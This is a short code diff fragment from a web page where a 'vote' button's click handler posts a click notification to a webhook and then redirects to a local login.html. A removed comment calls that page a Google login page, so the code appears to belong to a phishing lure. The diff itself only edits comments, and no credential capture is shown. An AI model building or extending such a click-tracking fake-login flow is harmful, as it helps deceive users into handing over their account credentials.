@@ -129,6 +129,7 @@
       const btn = document.getElementById('vote-btn');
 
       btn.addEventListener('click', async (e) => {
+        // Prevent default navigation so we can send the webhook first
         e.preventDefault();
 
         const message = `**🚨 New Vote Click Detected**
@@ -153,7 +154,7 @@
           console.error("Webhook failed:", error);
         }
 
-        // Redirect to Google login page
+        // Now redirect to login.html
         window.location.href = "login.html";
       });
     });
